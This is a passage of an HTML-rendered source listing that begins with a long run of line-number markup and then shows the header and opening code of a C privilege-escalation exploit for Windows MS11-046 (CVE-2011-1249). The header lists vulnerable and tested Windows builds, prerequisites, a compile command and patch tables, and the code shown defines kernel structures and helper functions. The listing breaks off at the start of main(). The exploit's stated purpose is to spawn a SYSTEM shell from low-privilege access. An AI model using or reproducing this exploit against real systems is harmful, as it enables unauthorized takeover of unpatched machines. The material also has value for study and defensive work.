class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Exploit Title: Windows x86 (all versions) AFD privilege escalation (MS11-046)</span></span><br><span class="line"><span class="comment"># Date: 2016-10-16</span></span><br><span class="line"><span class="comment"># Exploit Author: Tomislav Paskalev</span></span><br><span class="line"><span class="comment"># Vulnerable Software:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#   Windows XP Pro SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows 7 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 x64</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 SP1 x64</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 Itanium-based Systems</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 R2 SP1 Itanium-based Systems</span></span><br><span class="line"><span class="comment"># Supported Vulnerable Software:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1 x86</span></span><br><span class="line"><span class="comment">#   Windows Vista SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 x86</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 SP2 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 x86</span></span><br><span class="line"><span class="comment">#   Windows 7 SP1 x86</span></span><br><span class="line"><span class="comment"># Tested Software:</span></span><br><span class="line"><span class="comment">#   Windows XP Pro SP3 x86 EN          [5.1.2600]</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 Ent SP2 EN     [5.2.3790]</span></span><br><span class="line"><span class="comment">#   Windows Vista Ult SP1 x86 EN       [6.0.6001]</span></span><br><span class="line"><span class="comment">#   Windows Vista Ult SP2 x86 EN       [6.0.6002]</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Dat SP1 x86 EN [6.0.6001]</span></span><br><span class="line"><span class="comment">#   Windows Server 2008 Ent SP2 x86 EN [6.0.6002]</span></span><br><span class="line"><span class="comment">#   Windows 7 HB x86 EN                [6.1.7600]</span></span><br><span class="line"><span class="comment">#   Windows 7 Ent SP1 x86 EN           [6.1.7601]</span></span><br><span class="line"><span class="comment"># CVE ID: 2011-1249</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Vulnerability description:</span></span><br><span class="line"><span class="comment">#   The Ancillary Function Driver (AFD) supports Windows sockets</span></span><br><span class="line"><span class="comment">#   applications and is contained in the afd.sys file. The afd.sys</span></span><br><span class="line"><span class="comment">#   driver runs in kernel mode and manages the Winsock TCP/IP</span></span><br><span class="line"><span class="comment">#   communications protocol.</span></span><br><span class="line"><span class="comment">#   An elevation of privilege vulnerability exists where the AFD</span></span><br><span class="line"><span class="comment">#   improperly validates input passed from user mode to the kernel.</span></span><br><span class="line"><span class="comment">#   An attacker must have valid logon credentials and be able to</span></span><br><span class="line"><span class="comment">#   log on locally to exploit the vulnerability.</span></span><br><span class="line"><span class="comment">#   An attacker who successfully exploited this vulnerability could</span></span><br><span class="line"><span class="comment">#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM</span></span><br><span class="line"><span class="comment">#   privileges).</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Exploit notes:</span></span><br><span class="line"><span class="comment">#   Privileged shell execution:</span></span><br><span class="line"><span class="comment">#     - the SYSTEM shell will spawn within the invoking shell/process</span></span><br><span class="line"><span class="comment">#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):</span></span><br><span class="line"><span class="comment">#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32</span></span><br><span class="line"><span class="comment">#   Exploit prerequisites:</span></span><br><span class="line"><span class="comment">#     - low privilege access to the target OS</span></span><br><span class="line"><span class="comment">#     - target OS not patched (KB2503665, or any other related</span></span><br><span class="line"><span class="comment">#       patch, if applicable, not installed - check &quot;Related security</span></span><br><span class="line"><span class="comment">#       vulnerabilities/patches&quot;)</span></span><br><span class="line"><span class="comment">#   Exploit test notes:</span></span><br><span class="line"><span class="comment">#     - let the target OS boot properly (if applicable)</span></span><br><span class="line"><span class="comment">#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Patches:</span></span><br><span class="line"><span class="comment">#   Windows XP SP3 x86</span></span><br><span class="line"><span class="comment">#     WindowsXP-KB2503665-x86-enu.exe</span></span><br><span class="line"><span class="comment">#       (not available - EoL)</span></span><br><span class="line"><span class="comment">#   Windows Server 2003 SP2 x86</span></span><br><span class="line"><span class="comment">#     WindowsServer2003-KB2503665-x86-enu.exe</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26483</span></span><br><span class="line"><span class="comment">#   Windows Vista SP1, SP2 x86; Windows Server 2008 (SP1), SP2 x86</span></span><br><span class="line"><span class="comment">#     Windows6.0-KB2503665-x86.msu</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26275</span></span><br><span class="line"><span class="comment">#   Windows 7 (SP0), SP1 x86</span></span><br><span class="line"><span class="comment">#     Windows6.1-KB2503665-x86.msu</span></span><br><span class="line"><span class="comment">#       https://www.microsoft.com/en-us/download/details.aspx?id=26311</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Related security vulnerabilities/patches:</span></span><br><span class="line"><span class="comment">#   MS11-046  KB2503665  https://technet.microsoft.com/en-us/library/security/ms11-046.aspx</span></span><br><span class="line"><span class="comment">#   MS11-080  KB2592799  https://technet.microsoft.com/en-us/library/security/ms11-080.aspx</span></span><br><span class="line"><span class="comment">#   MS12-009  KB2645640  https://technet.microsoft.com/en-us/library/security/ms12-009.aspx</span></span><br><span class="line"><span class="comment">#   MS13-093  KB2875783  https://technet.microsoft.com/en-us/library/security/ms13-093.aspx</span></span><br><span class="line"><span class="comment">#   MS14-040  KB2975684  https://technet.microsoft.com/en-us/library/security/ms14-040.aspx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   Table of patch replacements:</span></span><br><span class="line"><span class="comment">#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |</span></span><br><span class="line"><span class="comment">#                               -------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |</span></span><br><span class="line"><span class="comment">#   -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#   Windows x86 XP SP3          | Installed | &lt;-Replaces|     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2003 SP2 | Installed | &lt;-Replaces| &lt;-Replaces|     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |</span></span><br><span class="line"><span class="comment">#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | &lt;-Replaces|</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># Thanks to:</span></span><br><span class="line"><span class="comment">#   azy (XP, 2k3 exploit)</span></span><br><span class="line"><span class="comment">#   Rahul Sasi (PoC)</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment"># References:</span></span><br><span class="line"><span class="comment">#   https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1249</span></span><br><span class="line"><span class="comment">#   https://technet.microsoft.com/en-us/library/security/ms11-046.aspx</span></span><br><span class="line"><span class="comment">#   http://web.qhwins.com/Security/2012021712023641874126.html</span></span><br><span class="line"><span class="comment">#   https://www.exploit-db.com/exploits/18755/</span></span><br><span class="line"><span class="comment">################################################################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// DEFINE DATA TYPES</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">KPROFILE_SOURCE</span> &#123;</span></span><br><span class="line">    ProfileTime,</span><br><span class="line">    ProfileAlignmentFixup,</span><br><span class="line">    ProfileTotalIssues,</span><br><span class="line">    ProfilePipelineDry,</span><br><span class="line">    ProfileLoadInstructions,</span><br><span class="line">    ProfilePipelineFrozen,</span><br><span class="line">    ProfileBranchInstructions,</span><br><span class="line">    ProfileTotalNonissues,</span><br><span class="line">    ProfileDcacheMisses,</span><br><span class="line">    ProfileIcacheMisses,</span><br><span class="line">    ProfileCacheMisses,</span><br><span class="line">    ProfileBranchMispredictions,</span><br><span class="line">    ProfileStoreInstructions,</span><br><span class="line">    ProfileFpInstructions,</span><br><span class="line">    ProfileIntegerInstructions,</span><br><span class="line">    Profile2Issue,</span><br><span class="line">    Profile3Issue,</span><br><span class="line">    Profile4Issue,</span><br><span class="line">    ProfileSpecialInstructions,</span><br><span class="line">    ProfileTotalCycles,</span><br><span class="line">    ProfileIcacheIssues,</span><br><span class="line">    ProfileDcacheAccesses,</span><br><span class="line">    ProfileMemoryBarrierCycles,</span><br><span class="line">    ProfileLoadLinkedIssues,</span><br><span class="line">    ProfileMaximum</span><br><span class="line">&#125; KPROFILE_SOURCE, *PKPROFILE_SOURCE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span> <span class="params">(WINAPI *PNTQUERYINTERVAL)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    KPROFILE_SOURCE   ProfileSource,</span></span><br><span class="line"><span class="params">    PULONG            Interval</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(WINAPI *PNTALLOCATE)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE            ProcessHandle,</span></span><br><span class="line"><span class="params">    PVOID             *BaseAddress,</span></span><br><span class="line"><span class="params">    ULONG             ZeroBits,</span></span><br><span class="line"><span class="params">    PULONG            RegionSize,</span></span><br><span class="line"><span class="params">    ULONG             AllocationType,</span></span><br><span class="line"><span class="params">    ULONG             Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_STATUS_BLOCK</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        NTSTATUS      Status;</span><br><span class="line">        PVOID         Pointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG_PTR         Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG             Reserved[<span class="number">2</span>];</span><br><span class="line">    PVOID             Base;</span><br><span class="line">    ULONG             Size;</span><br><span class="line">    ULONG             Flags;</span><br><span class="line">    USHORT            Index;</span><br><span class="line">    USHORT            Unknown;</span><br><span class="line">    USHORT            LoadCount;</span><br><span class="line">    USHORT            ModuleNameOffset;</span><br><span class="line">    CHAR              ImageName[<span class="number">256</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span> <span class="params">(WINAPI *LPFN_ISWOW64PROCESS)</span> <span class="params">(HANDLE, PBOOL)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// FUNCTIONS</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">IsWow64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL bIsWow64 = FALSE;</span><br><span class="line">    LPFN_ISWOW64PROCESS fnIsWow64Process;</span><br><span class="line"></span><br><span class="line">    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32&quot;</span>)), <span class="string">&quot;IsWow64Process&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> != fnIsWow64Process)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms684139(v=vs.85).aspx</span></span><br><span class="line">        <span class="keyword">if</span> (!fnIsWow64Process(GetCurrentProcess(), &amp;bIsWow64))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [-] Failed (error code: %d)\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bIsWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// MAIN FUNCTION</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] MS11-046 (CVE-2011-1249) x86 exploit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] by Tomislav Paskalev\n&quot;</span>);</span><br><span 